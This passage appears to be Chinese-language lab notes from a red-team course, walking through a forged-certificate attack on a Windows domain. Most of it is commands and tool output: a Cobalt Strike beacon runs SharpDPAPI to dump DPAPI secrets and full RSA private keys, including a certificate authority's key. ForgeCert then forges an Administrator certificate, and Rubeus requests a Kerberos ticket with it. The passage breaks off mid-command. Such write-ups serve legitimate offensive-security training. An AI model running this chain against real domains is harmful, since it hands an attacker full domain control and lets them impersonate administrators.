[+] host called home, sent: 236117 bytes
[+] received output:

  __                 _   _       _ ___ 
 (_  |_   _. ._ ._  | \ |_) /\  |_) |  
 __) | | (_| |  |_) |_/ |  /--\ |  _|_ 
                |                      
  v1.11.2                               


[*] Action: Certificate Triage
[*] Elevating to SYSTEM via token duplication for LSA secret retrieval
[*] RevertToSelf()

[*] Secret  : DPAPI_SYSTEM
[*]    full: 162219D12A3FCFFC69148F7D51505C10D3C13E7CCCCEE7CD65E9B8DB5C41759B270D043DAD24301A
[*]    m/u : 162219D12A3FCFFC69148F7D51505C10D3C13E7C / CCCEE7CD65E9B8DB5C41759B270D043DAD24301A


[+] received output:

[*] SYSTEM master key cache:

...


[*] Triaging System Certificates


Folder       : C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys


[+] received output:
  File               : 4e6ae791bb5861ec4d3cebd05a94eaf8_8e19ce86-bab3-48b9-9e9a-ac43335581bb

    Provider GUID    : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
    Master Key GUID  : {8c9727f5-d3bd-4368-a8a3-2c3aefd7c3f8}
    Description      : CryptoAPI Private Key
    algCrypt         : CALG_AES_256 (keyLen 256)
    algHash          : CALG_SHA_512 (32782)
    Salt             : 04b29e800f18445c360acc9c57d37f06a54f6e55febcf85feda12ce3a855dbdd
    HMAC             : 0c49492233c73807c82ed645ad489eb5806e1cdb7102de89c650f4ca6408533f
    Unique Name      : te-DomainController-896b6c07-beb2-4557-a862-a76b04a36959


[+] received output:
    Thumbprint       : DBC08781BE7661418EA56213D798746CEF4F8722
    Issuer           : CN=ca-1, DC=cyberbotic, DC=io
    Subject          : CN=dc-1.cyberbotic.io
    Valid Date       : 2/25/2022 12:00:46 PM
    Expiry Date      : 2/25/2023 12:00:46 PM
    Enhanced Key Usages:
        Client Authentication (1.3.6.1.5.5.7.3.2)
         [!] Certificate is used for client auth!
        Server Authentication (1.3.6.1.5.5.7.3.1)

    [*] Private key file 4e6ae791bb5861ec4d3cebd05a94eaf8_8e19ce86-bab3-48b9-9e9a-ac43335581bb was recovered:

-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAskdg1JRBS0plZUp/0dcveSuu8P1kqUtLRZbUgExdKAc6LyNf
w6OTgZ0F1iy2rLsFOEkXS+Cn9YaX9eP0ixIOMF/tSSM4bcSLgJV5Ofmy2IX/wfVV
Ct1EAHBOYL0mIrFOuKHrvWZDK3n0L3AxKhbig5NMLcZ4/DL40YLUWS0M2ReIFTnx
mtGznOrbVp9BN5i0oh0zZn0CumhpIfqeLyf0nk6Nh2m6JdFdtb0I71/Jyg24s+2p
DeAFY1B9TyJHitPj7tmmj0m7OirRgv8AWF9gSjsWdXtOLlj+VqgvF7S3wxMjbm/d
tbRu3Yq/uTF3CCFuYGRIwIX9odnYAU6Pvx/bBQIDAQABAoIBAA1oKcOCzLA9TYfD
BP7CWHsbymGsJKRImcYHdD6bv4uxk3IVDnAXfpHKPbSgEzLFM7zKXlqh7++aahYf
SPYmavO/WwhbgjRbCgSm+QFfok//L78l1HnnLuR7jaFfyBzmyZ0/7AsHxDhiSPdC
UCgypWEwtBNjMBkDOkwDMzXrmeI/buFW0lhgZSeSpVAWGZdVd0TfvT+oh6irt/Tm
XO5eFJkpt14g93CeGsaGuOQu8nsaEu8l0KbpwqPbST0ikel2Us+WkM6d/QRKzoqg
jkQBz2JeJiBviX63y+tk0gBq9fsJDFbLGCZljRVJumGi6AMx986f0mYE2/da/Jdl
MG64dKECgYEAu7jre6OMv3htSVvda9rAh5nDYwOCkgdcT1EH14C/SnbB9Z75wMjV
o5ekMfaOPKBGD69wCAjzjW0EshpzBMvVgPVWSVL8h71o0GhbvGQVRQs1mBUUOrN0
UeUJKHthyS/2FEA8VOAokPSyfT7tdA+W0HhhTTfz6r78Rg7MtFGKL5ECgYEA8x8o
yu8aEsO0nAtbfzgQ5F98Aw/oRQ6aUEWlrQJzoFnC8y3yCQUEEcOjh/9zHGSTiKVK
6tFtT1Y2ViGAbo7h6GTv7hgvnN1axtPi+pTxzzFVMzyoUeBFOmTAvft1h/Y+rDza
RhaRekqpryYhH9He/2yQHCLGfBxyT59bttAm4jUCgYBUiIlCO/v9nPVZu4ySLQfW
CF/8DnCV4cqnzQ2C9e8uURw2x0ggkE/kQz0lYqnakzH5jj8c3ysN3LHoohB5cHDM
ia45hq1BUwIIF3Z393m8hbe0rIlXhcgzuLfPCwCV4Isnw2VnsymRXR+jVtsHEJ4R
cqQeabvlUeu4gKGd8boQgQKBgDRECZf+6QMJsaUuR+BEpFUENfvOiqd16TTClEhq
U4MwaNmwkezgeCx9e4V8JDoBYToqFr3+gdphdVL05tBdxTEZqf7skifN6nr+CDjI
lmdtepyGOMVJSniwOkNdcLnm9Tg/6MjShzncHTh7IPnfO2p740s5KqR51RVK9AOM
Ih/VAoGAal+1DGnPANj6C4kxrnGrTJ4+7hEYAEhgQifnmnie2igtJXe8ic0HB+x0
/PTMrldIG37nakFzM5bTD7SK9D7npwE20JMBjLLCSB5tDxXBnKOq3EXDef9GrMOO
pAVlte0hvf4mqAw3X5sfLdRmcW+zV+rlhIHZYkWdwN7FE5UQWG8=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIFyDCCBLCgAwIBAgITZAAAAAJ7OQoioiM/pAAAAAAAAjANBgkqhkiG9w0BAQsF
ADA/MRIwEAYKCZImiZPyLGQBGRYCaW8xGjAYBgoJkiaJk/IsZAEZFgpjeWJlcmJv
dGljMQ0wCwYDVQQDEwRjYS0xMB4XDTIyMDIyNTEyMDA0NloXDTIzMDIyNTEyMDA0
NlowHTEbMBkGA1UEAxMSZGMtMS5jeWJlcmJvdGljLmlvMIIBIjANBgkqhkiG9w0B
AQEFAAOCAQ8AMIIBCgKCAQEAskdg1JRBS0plZUp/0dcveSuu8P1kqUtLRZbUgExd
KAc6LyNfw6OTgZ0F1iy2rLsFOEkXS+Cn9YaX9eP0ixIOMF/tSSM4bcSLgJV5Ofmy
2IX/wfVVCt1EAHBOYL0mIrFOuKHrvWZDK3n0L3AxKhbig5NMLcZ4/DL40YLUWS0M
2ReIFTnxmtGznOrbVp9BN5i0oh0zZn0CumhpIfqeLyf0nk6Nh2m6JdFdtb0I71/J
yg24s+2pDeAFY1B9TyJHitPj7tmmj0m7OirRgv8AWF9gSjsWdXtOLlj+VqgvF7S3
wxMjbm/dtbRu3Yq/uTF3CCFuYGRIwIX9odnYAU6Pvx/bBQIDAQABo4IC3TCCAtkw
LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUMyUwT2FxXZdqQKLk
m5VUNgerz4cwHwYDVR0jBBgwFoAUr3kvw/xFuos+/emk1l+AKqj3ah0wgcEGA1Ud
HwSBuTCBtjCBs6CBsKCBrYaBqmxkYXA6Ly8vQ049Y2EtMSxDTj1kYy0xLENOPUNE
UCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25m
aWd1cmF0aW9uLERDPWN5YmVyYm90aWMsREM9aW8/Y2VydGlmaWNhdGVSZXZvY2F0
aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIG4
BggrBgEFBQcBAQSBqzCBqDCBpQYIKwYBBQUHMAKGgZhsZGFwOi8vL0NOPWNhLTEs
Q049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENO
PUNvbmZpZ3VyYXRpb24sREM9Y3liZXJib3RpYyxEQz1pbz9jQUNlcnRpZmljYXRl
P2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTA+BgNVHREE
NzA1oB8GCSsGAQQBgjcZAaASBBA24P3PgdVCSo3RjxrNbEcBghJkYy0xLmN5YmVy
Ym90aWMuaW8wDQYJKoZIhvcNAQELBQADggEBAJu1sPBWbx9O9fNHH1S5U7u42/Yy
bU21TG+ZMGIz7gDTQDobko8RNOaoIa85O1u4DK75+lrsV8bM/uy3hh6rML+xqtLW
9qUOim4OTFb3vK3Pc0KobCHJ+GvQTm1yM3Hw5X4S2+Tm6ET7xvoPKdJU2C69VeSD
Q5dAFJ9IL6GQMQAAlCyLe5tgkLKlce6W09YXwEh3VEryM3q7xim0vtUcJtD+MBsf
ZUShPYoXwipV7F3HQM1G03RUoBWKy1oZ5amj8spVbfP5n6S43z5MeRNyRrL5aKD1
zgYw7RnqTaXFqzjD8yzgB0oGTogO3uswtg/KjqMbtvdYyOkMZua3+1Ol8Sc=
-----END CERTIFICATE-----



[+] received output:
[X] Error triaging 7a436fe806e483969f48a894af2fe9a1_8e19ce86-bab3-48b9-9e9a-ac43335581bb : Bad Data.

[X] Error triaging c2319c42033a5ca7f44e731bfd3fa2b5_8e19ce86-bab3-48b9-9e9a-ac43335581bb : Bad Data.


[+] received output:

Folder       : C:\ProgramData\Microsoft\Crypto\Keys


[+] received output:
  File               : 94a7f956733f9deca2134196593629ec_8e19ce86-bab3-48b9-9e9a-ac43335581bb

    Provider GUID    : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
    Master Key GUID  : {8c9727f5-d3bd-4368-a8a3-2c3aefd7c3f8}
    Description      : Private Key
    algCrypt         : CALG_AES_256 (keyLen 256)
    algHash          : CALG_SHA_512 (32782)
    Salt             : 641ea58d82419d082bc0bdcc995ebaaea53b014b1a684dd779c44ee5f56ae0dc
    HMAC             : b3881deb832f0071ec27e5d95e48e0db16994f8c9acda9e3b221961fe5f6f252
    Unique Name      : ca-1

    Thumbprint       : 7F8A1EFB7A50E2D1DE098085301926AA13AE0A71
    Issuer           : CN=ca-1, DC=cyberbotic, DC=io
    Subject          : CN=ca-1, DC=cyberbotic, DC=io
    Valid Date       : 2/25/2022 11:29:14 AM
    Expiry Date      : 2/25/2047 11:39:08 AM

    [*] Private key file 94a7f956733f9deca2134196593629ec_8e19ce86-bab3-48b9-9e9a-ac43335581bb was recovered:

-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEApvfnZ/nhVjQG09Kk9AH/XtTPNQjPhwqANiTH8LCGkDcIVXgb
xfweIW0oZkTuPly0wRYxlmQqTUF3ObnEJcfppXsbjOR0SpDo2scrXZJi8D4wSHPg
pQJmairNa31BggDgguRML1bqxf8Lzx3qwS+w913PkAmiIeD1t/W1cdHmRpJrJoL6
nbw4CtOXVWpGO7IinREuFHBUeMYi2kPfC3bT0luH9tmnuqA0RoRj2vmdCTD103sq
1ymqsjbVGs/e0p2nJ7pvOaWCC7/cuWRHLyDnnhVdDumQ5ljH2KTCAf3DGy/+LJN1
Cgw3j3vS32+d5uhEna2hoGETNtn1dc0z3Tjd/QIDAQABAoIBAA8mCs66MyGZEs2B
HQoubDb0Y+BR7lI4N62x5JoHyg2nkJAAl7R8zVcHClVNB7iMvLGQC+uzJstflyub
mRo8awxigPtlds+VGitPSrXwpB1b5xGLweP2tcgIHh8UfC8JWVVG1UquPhq8qxud
gUEJzKqEzmIpHZapTGHmXxH2k0fvt1d1wEncBCQ2E92ExdaizFHpkqH2605lONWJ
xiZrZAxdpzcJM99RHA4a3zuuqcqavfrGRJ3LaeEG2yK/lttKCgH7TiZe1IwPmEAq
A0/gzulAHkok2LxzARYtoRvwZOwQUs1yCMbs0lcQyvQxpqmYW9l2dtq9s16a1onT
NZrhR0ECgYEAywy1NGlzGBUkmiLScI1m8aw1V5t/T9yHJhtQ/o5TDiHtPuRWzYtK
2oBfiWuT4ukikotiEP7cxtCO4Vk9Gt21UYC/+6zAv3hT68z0owGgmr58aoC5WhTB
5im65EGPvzRFV1oJpNVH7fDFn/UADFgfdSqj5bdL1HoqIyMeZ9I00SkCgYEA0oJ2
5tsmgl8oI+CtN5yHKuH3dIBHrKMcqcp2CIVW/Iz3j2Sj9wJBqK7a1CAYmL8pUIfk
xfkFLQ34Xs5JPve158b0PvPANewxdcyQjqfFERyamnSQtCL5EKXBVwLBKKaKQlgO
aRfaBLz5Gq1F2vRZJttjRePkgMTbsAX4ncyMnLUCgYAj8u0GCYFiCyQ+0dl2KeLG
+Nk82H/y0LVwzrdJSkN0JheN4floTLgE9WN0vgIh02rWjSzgm27VGEmjphwGbKhU
dLoIwe4iOBiLj+7kCT65Bu6aII4wX6pwqIS5Ms5TaNq5+2vnrgcdHlqu1j6a8OMo
6FK6MfiP9s0NCYOxl+rX+QKBgHFMqMQ9xW872fXdcj1RMOrirfX1KR6At+emwXp6
kcPh90glKZ7DhyVL3xl2oOZtVMY0Lexjx+Zk833LV17dofk6erD7LkOXeVNmo5M0
NvurwoZJIKzjedv86p9zKxU+9YEZtb/Yh44vS3+RLNzY0Lb6M2clbhHkYj1OKW58
7l1VAoGAfRZUVLh4BikSYK+GFNtJ8nNnPAwrg9Eeg9utwiWHjtRgeO0jTAbIkyJD
23ZAOCTx1ktzpwEJulhRv8iu6djeBC03mW4Rgp6mrObhpJwQXq+7EqmWAKLM42iI
IZgtVOrHNW41DvNDz05M9wsXBxgo0KOSaRaqDGawouqonshMuVo=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIDWTCCAkGgAwIBAgIQMayDxmePKJlM+1ggfJ+2aDANBgkqhkiG9w0BAQsFADA/
MRIwEAYKCZImiZPyLGQBGRYCaW8xGjAYBgoJkiaJk/IsZAEZFgpjeWJlcmJvdGlj
MQ0wCwYDVQQDEwRjYS0xMB4XDTIyMDIyNTExMjkxNFoXDTQ3MDIyNTExMzkwOFow
PzESMBAGCgmSJomT8ixkARkWAmlvMRowGAYKCZImiZPyLGQBGRYKY3liZXJib3Rp
YzENMAsGA1UEAxMEY2EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
AKb352f54VY0BtPSpPQB/17UzzUIz4cKgDYkx/CwhpA3CFV4G8X8HiFtKGZE7j5c
tMEWMZZkKk1Bdzm5xCXH6aV7G4zkdEqQ6NrHK12SYvA+MEhz4KUCZmoqzWt9QYIA
4ILkTC9W6sX/C88d6sEvsPddz5AJoiHg9bf1tXHR5kaSayaC+p28OArTl1VqRjuy
Ip0RLhRwVHjGItpD3wt209Jbh/bZp7qgNEaEY9r5nQkw9dN7KtcpqrI21RrP3tKd
pye6bzmlggu/3LlkRy8g554VXQ7pkOZYx9ikwgH9wxsv/iyTdQoMN4970t9vnebo
RJ2toaBhEzbZ9XXNM9043f0CAwEAAaNRME8wCwYDVR0PBAQDAgGGMA8GA1UdEwEB
/wQFMAMBAf8wHQYDVR0OBBYEFK95L8P8RbqLPv3ppNZfgCqo92odMBAGCSsGAQQB
gjcVAQQDAgEAMA0GCSqGSIb3DQEBCwUAA4IBAQARN7u74itssVPEeYkYvXMmmvo2
68FrIaMVhjCm4q2c0LaLExV+3r/DTPtwkgB1k6Sd8y3pricHVPCWlp7VhSteMk/4
aC0oUX9MOBQFS17FlOVob7c4q7hZDFZX6gBeq7/LHhFauWKiHpC95jrq+tNBb+7j
VhLeA215xVF1/UQ4/rlnurZiXZiYl9LD0IHQumUVhR5HED/nW+mDL9+FNJsyy8XR
VRfRg+HIWuWq3UJfiUaSuVWBYMYdluvwWlT2SZXlkk95Q0v1TmvRyR821RkHdFoR
QQPiifeJ7qwkm4h5pRqbLWuKZqhhIv/kDLoaGncUXmJWciLOtLhHXwRkZREd
-----END CERTIFICATE-----



Folder       : C:\ProgramData\Microsoft\Crypto\SystemKeys


[+] received output:

Folder       : C:\Windows\ServiceProfiles\LocalService\AppData\Roaming\Microsoft\Crypto\Keys


[+] received output:

[*] Hint: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx


SharpDPAPI completed in 00:00:12.3010677


```

2. 复制上面证书内容到cert.pem，然后在kali上使用openssl输出成cert.pfx

```
root@kali:~# openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Enter Export Password:
Verifying - Enter Export Password:
root@kali:~# ls
10.10.17.68_samhashes.sam  cert.pfx            Desktop    Downloads  names.txt  possible-usernames.txt  Templates  Tools   wordlist
cert.pem                   cobaltstrike.store  Documents  Music      Pictures   Public                  test.txt   Videos
```



![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661077999500.png)

3. 使用ForgeCert.exe请求一张新证书
```
c:\Users\Administrator\Desktop>C:\Tools\ForgeCert\ForgeCert\bin\Debug\ForgeCert.exe --CaCertPath cert.pfx --CaCertPassword "123456" --Subject "CN=User" --SubjectAltName "Administrator@cyberbotic.io" --NewCertPath fake.pfx --NewCertPassword "password"
CA Certificate Information:
  Subject:        CN=ca-1, DC=cyberbotic, DC=io
  Issuer:         CN=ca-1, DC=cyberbotic, DC=io
  Start Date:     2/25/2022 11:29:14 AM
  End Date:       2/25/2047 11:39:08 AM
  Thumbprint:     7F8A1EFB7A50E2D1DE098085301926AA13AE0A71
  Serial:         31AC83C6678F28994CFB58207C9FB668

Forged Certificate Information:
  Subject:        CN=User
  SubjectAltName: Administrator@cyberbotic.io
  Issuer:         CN=ca-1, DC=cyberbotic, DC=io
  Start Date:     8/21/2022 10:41:54 AM
  End Date:       8/21/2023 10:41:54 AM
  Thumbprint:     CA43D97A26EFEC0F8BA9A5CCB85229BDA9E3D9CB
  Serial:         009118A777252186D0CD842B7FB2A3C9F2

Done. Saved forged certificate to fake.pfx with the password 'password'
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661079472601.png)


4. base64导出上面新证书的内容
```
PS C:\Users\Administrator\Desktop> $FileName='C:\Users\Administrator\Desktop\fake.pfx'
PS C:\Users\Administrator\Desktop>  [Convert]::ToBase64String([IO.File]::ReadAllBytes($FileName))
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
```



5. 根据证书请求一张tgt，certificate参数使用上面bases64的内容
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:Administrator /domain:cyberbotic.io /certificate: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